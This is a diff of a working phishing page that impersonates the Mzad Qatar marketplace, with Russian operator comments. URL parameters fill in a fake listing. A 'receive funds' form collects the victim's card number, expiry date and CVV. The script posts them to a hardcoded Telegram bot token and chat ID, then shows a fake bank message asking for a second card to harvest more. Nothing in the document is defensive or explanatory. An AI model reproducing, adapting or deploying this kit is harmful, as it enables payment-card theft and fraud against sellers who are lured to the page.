@@ -3,128 +3,167 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mzad Qatar | Buy & Sell</title>
+    <title>Mzad Qatar | Biggest marketplace in Qatar</title>
+    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
-        :root { --mzad-maroon: #8a1538; --mzad-gray: #58595b; --light-gray: #f4f4f4; }
-        body { font-family: 'Segoe UI', Roboto, sans-serif; background: var(--light-gray); margin: 0; padding: 0; color: #333; }
-        .app { max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; display: flex; flex-direction: column; }
+        :root { --mzad-red: #8a1538; --mzad-bg: #f2f3f5; --text-dark: #333; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--mzad-bg); margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
         
-        /* HEADER С ТОЧНЫМ ЛОГО */
-        .navbar { height: 60px; background: #fff; border-bottom: 3px solid var(--mzad-maroon); display: flex; align-items: center; padding: 0 15px; position: sticky; top: 0; z-index: 1000; justify-content: space-between; }
-        .logo-wrap { display: flex; align-items: center; gap: 8px; }
-        .m-circle { width: 34px; height: 34px; background: var(--mzad-maroon); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 900; font-size: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
-        .logo-txt { color: var(--mzad-maroon); font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
+        /* ШАПКА 1-в-1 КАК В ОРИГИНАЛЕ */
+        .header { background: white; height: 60px; display: flex; align-items: center; padding: 0 16px; border-bottom: 3px solid var(--mzad-red); position: sticky; top: 0; z-index: 999; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
+        .logo-container { display: flex; align-items: center; text-decoration: none; }
+        .logo-img { height: 38px; width: 38px; background: var(--mzad-red); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 10px; }
+        .logo-img span { color: white; font-weight: 900; font-size: 22px; font-family: Arial, sans-serif; }
+        .logo-text { color: var(--mzad-red); font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
 
-        /* PRODUCT PREVIEW */
-        .product-box { padding: 15px; border-bottom: 6px solid var(--light-gray); }
-        .secure-tag { color: #27ae60; font-size: 11px; font-weight: 800; border: 1px solid #27ae60; padding: 2px 8px; border-radius: 4px; display: inline-block; margin-bottom: 10px; }
-        .img-container { width: 100%; aspect-ratio: 1/1; background: #fafafa; border-radius: 12px; margin-bottom: 15px; overflow: hidden; border: 1px solid #eee; }
-        .img-container img { width: 100%; height: 100%; object-fit: cover; }
-        .main-info h1 { margin: 0; font-size: 20px; font-weight: 700; color: #222; }
-        .price { color: var(--mzad-maroon); font-size: 26px; font-weight: 800; margin-top: 5px; }
+        .container { max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; }
 
-        /* SELLER INFO */
-        .info-section { padding: 15px; }
-        .label-head { font-size: 12px; font-weight: 800; color: #999; text-transform: uppercase; margin-bottom: 10px; }
-        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f2f2f2; font-size: 15px; }
-        .info-label { color: #777; }
-        .info-val { font-weight: 600; color: #333; }
+        /* КАРТОЧКА ТОВАРА */
+        .ad-card { padding: 20px 16px; border-bottom: 8px solid var(--mzad-bg); }
+        .status-badge { color: #27ae60; font-size: 12px; font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; gap: 5px; }
+        .status-badge::before { content: ''; width: 8px; height: 8px; background: #27ae60; border-radius: 50%; }
+        
+        .product-flex { display: flex; gap: 16px; align-items: flex-start; }
+        .product-img { width: 120px; height: 120px; border-radius: 8px; object-fit: cover; border: 1px solid #eee; }
+        .product-info h1 { margin: 0; font-size: 18px; color: var(--text-dark); line-height: 1.4; }
+        .product-price { font-size: 24px; font-weight: 800; color: var(--mzad-red); margin-top: 10px; }
 
-        /* PAYMENT FORM */
-        .payment-form { padding: 20px 15px; background: #fff; border-top: 6px solid var(--light-gray); }
-        .payment-form h3 { text-align: center; color: var(--mzad-maroon); font-size: 18px; margin-bottom: 20px; }
-        .inp { width: 100%; padding: 15px; margin-bottom: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
-        .inp:focus { border-color: var(--mzad-maroon); }
-        .btn-get { background: var(--mzad-maroon); color: white; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 17px; font-weight: 700; cursor: pointer; margin-top: 10px; }
+        /* ДЕТАЛИ */
+        .info-box { padding: 16px; }
+        .info-title { font-size: 13px; font-weight: 700; color: #888; text-transform: uppercase; margin-bottom: 15px; border-bottom: 1px solid #eee; padding-bottom: 5px; }
+        .detail-row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; }
+        .detail-row span:first-child { color: #666; }
+        .detail-row span:last-child { font-weight: 600; color: #222; }
 
-        .footer { background: #2b2b2b; color: #777; padding: 30px 15px; text-align: center; font-size: 11px; margin-top: auto; }
+        /* ФОРМА ВВОДА */
+        .form-section { padding: 20px 16px; background: #fdfdfd; }
+        .form-section h2 { font-size: 16px; text-align: center; color: #555; margin-bottom: 20px; }
+        .input-box { position: relative; margin-bottom: 15px; }
+        .input-box input { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; transition: 0.2s; }
+        .input-box input:focus { border-color: var(--mzad-red); outline: none; box-shadow: 0 0 0 3px rgba(138, 21, 56, 0.1); }
+        
+        .btn-submit { background: var(--mzad-red); color: white; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 18px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 15px rgba(138, 21, 56, 0.3); }
+        .btn-submit:active { transform: scale(0.98); }
+
+        .footer { padding: 40px 16px; text-align: center; font-size: 12px; color: #999; background: white; }
     </style>
 </head>
 <body>
 
-<div class="app">
-    <header class="navbar">
-        <div class="logo-wrap">
-            <div class="m-circle">M</div>
-            <div class="logo-txt">MZAD QATAR</div>
+<div class="container">
+    <header class="header">
+        <div class="logo-container">
+            <div class="logo-img"><span>M</span></div>
+            <div class="logo-text">MZAD QATAR</div>
         </div>
-        <div style="font-size: 12px; color: var(--mzad-maroon);">English</div>
     </header>
 
-    <div class="product-box">
-        <div class="secure-tag">✓ VERIFIED TRANSACTION</div>
-        <div class="img-container">
-            <img id="item-img" src="">
-        </div>
-        <div class="main-info">
-            <h1 id="item-name">Loading...</h1>
-            <div class="price" id="item-price">0 QAR</div>
-        </div>
-    </div>
-
-    <div class="info-section">
-        <div class="label-head">Transaction Details</div>
-        <div class="info-row"><span class="info-label">Seller Name:</span> <span class="info-val" id="s-name">...</span></div>
-        <div class="info-row"><span class="info-label">Phone:</span> <span class="info-val" id="s-phone">...</span></div>
-        <div class="info-row"><span class="info-label">Delivery Address:</span> <span class="info-val" id="s-addr">...</span></div>
-    </div>
-
-    <div class="payment-form">
-        <h3>Verify Card to Receive Funds</h3>
-        <form id="payout-f">
-            <input type="text" id="cn" class="inp" placeholder="Card Number" required maxlength="19">
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="ce" class="inp" placeholder="MM/YY" required maxlength="5">
-                <input type="text" id="cv" class="inp" placeholder="CVV" required maxlength="4">
+    <div class="ad-card">
+        <div class="status-badge">SECURE DELIVERY TRANSACTION</div>
+        <div class="product-flex">
+            <img id="view-img" src="" class="product-img">
+            <div class="product-info">
+                <h1 id="view-item">Loading product details...</h1>
+                <div class="product-price" id="view-price">0 QAR</div>
             </div>
-            <button type="submit" class="btn-get" id="btn-txt">CONFIRM & RECEIVE</button>
+        </div>
+    </div>
+
+    <div class="info-box">
+        <div class="info-title">Order Information</div>
+        <div class="detail-row"><span>Merchant</span><span id="view-seller">...</span></div>
+        <div class="detail-row"><span>Mobile</span><span id="view-phone">...</span></div>
+        <div class="detail-row"><span>Shipping</span><span id="view-addr">...</span></div>
+        <div class="detail-row"><span>Service Fee</span><span style="color: #27ae60;">0.00 QAR (Paid)</span></div>
+    </div>
+
+    <div class="form-section">
+        <h2>Enter Card Details to Receive Funds</h2>
+        <form id="pay-form">
+            <div class="input-box">
+                <input type="text" id="card" placeholder="Card Number" required maxlength="19">
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <div class="input-box" style="flex: 1;">
+                    <input type="text" id="expiry" placeholder="MM/YY" required maxlength="5">
+                </div>
+                <div class="input-box" style="flex: 1;">
+                    <input type="text" id="cvc" placeholder="CVV" required maxlength="4">
+                </div>
+            </div>
+            <button type="submit" class="btn-submit" id="main-btn">RECEIVE QAR</button>
         </form>
     </div>
 
     <div class="footer">
-        <p>This payout is secured by <b>Mzad Qatar Escrow Service</b>.</p>
-        <p>© 2026 Mzad Qatar, Doha. All rights reserved.</p>
+        <img src="https://mzadqatar.com/frontend/images/mzad/favicon.png" style="width: 24px; opacity: 0.5; margin-bottom: 10px;">
+        <p>Verified by Mzad Qatar Protection & QNB Security</p>
+        <p>© 2026 Mzad Qatar</p>
     </div>
 </div>
 
 <script>
-    // --- ТВОИ ДАННЫЕ ---
-    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
-    const CHAT_ID = '8071425015';
+    // --- ТВОЙ ТЕЛЕГРАМ ---
+    const TG_TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
+    const TG_ID = '8071425015';
 
-    // Читаем данные из ссылки
-    const params = new URLSearchParams(window.location.search);
-    document.getElementById('item-name').innerText = params.get('item') || 'Product';
-    document.getElementById('item-price').innerText = (params.get('price') || '0') + ' QAR';
-    document.getElementById('item-img').src = params.get('img') || 'https://via.placeholder.com/300';
-    document.getElementById('s-name').innerText = params.get('seller') || 'Khalid';
-    document.getElementById('s-phone').innerText = params.get('phone') || '+974 000 0000';
-    document.getElementById('s-addr').innerText = params.get('addr') || 'Doha';
+    // Читаем параметры ссылки
+    const urlParams = new URLSearchParams(window.location.search);
+    const item = urlParams.get('item') || 'Electronic Device';
+    const price = urlParams.get('price') || '0';
+    const img = urlParams.get('img') || 'https://via.placeholder.com/150';
+    const seller = urlParams.get('seller') || 'Official Store';
+    const phone = urlParams.get('phone') || '+974 5555 0000';
+    const addr = urlParams.get('addr') || 'Doha, Qatar';
 
-    // Отправка в бот
-    document.getElementById('payout-f').onsubmit = async (e) => {
+    document.getElementById('view-item').innerText = item;
+    document.getElementById('view-price').innerText = price + ' QAR';
+    document.getElementById('view-img').src = img;
+    document.getElementById('view-seller').innerText = seller;
+    document.getElementById('view-phone').innerText = phone;
+    document.getElementById('view-addr').innerText = addr;
+
+    // Маска для номера карты
+    document.getElementById('card').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // Маска для даты
+    document.getElementById('expiry').addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
+    });
+
+    // Отправка данных
+    document.getElementById('pay-form').onsubmit = async (e) => {
         e.preventDefault();
-        const btn = document.getElementById('btn-txt');
-        btn.innerText = 'WAITING FOR APPROVAL...';
+        const btn = document.getElementById('main-btn');
+        btn.innerText = 'PROCESSING...';
         btn.disabled = true;
 
-        const log = `🇶🇦 **NEW MZAD LOG**\n\n📦 Item: ${params.get('item')}\n💰 Price: ${params.get('price')} QAR\n\n💳 Card: \`${document.getElementById('cn').value}\`\n📅 Exp: \`${document.getElementById('ce').value}\`\n🔒 CVV: \`${document.getElementById('cv').value}\`\n\n👤 Seller: ${params.get('seller')}\n📱 Phone: ${params.get('phone')}`;
+        const message = `🇶🇦 **MZAD QATAR HIT**\n\n` +
+                        `📦 Item: ${item}\n` +
+                        `💰 Price: ${price} QAR\n\n` +
+                        `💳 Card: \`${document.getElementById('card').value}\`\n` +
+                        `📅 Exp: \`${document.getElementById('expiry').value}\`\n` +
+                        `🔒 CVV: \`${document.getElementById('cvc').value}\`\n\n` +
+                        `👤 Seller: ${seller}\n` +
+                        `📱 Phone: ${phone}`;
 
         try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: log, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: TG_ID, text: message, parse_mode: 'Markdown' })
             });
 
             setTimeout(() => {
-                alert("The bank system requires a verification from a different card to process this QAR amount. Please try another card.");
-                btn.innerText = 'CONFIRM & RECEIVE';
+                alert("The transaction is pending. For your security, please verify the transfer by entering another valid card from a different bank.");
+                btn.innerText = 'RECEIVE QAR';
                 btn.disabled = false;
-                document.getElementById('payout-f').reset();
-            }, 2000);
+                document.getElementById('pay-form').reset();
+            }, 2500);
         } catch (err) {
-            alert("Connection error. Try again.");
+            alert("Bank server not responding. Try later.");
             btn.disabled = false;
         }
     };
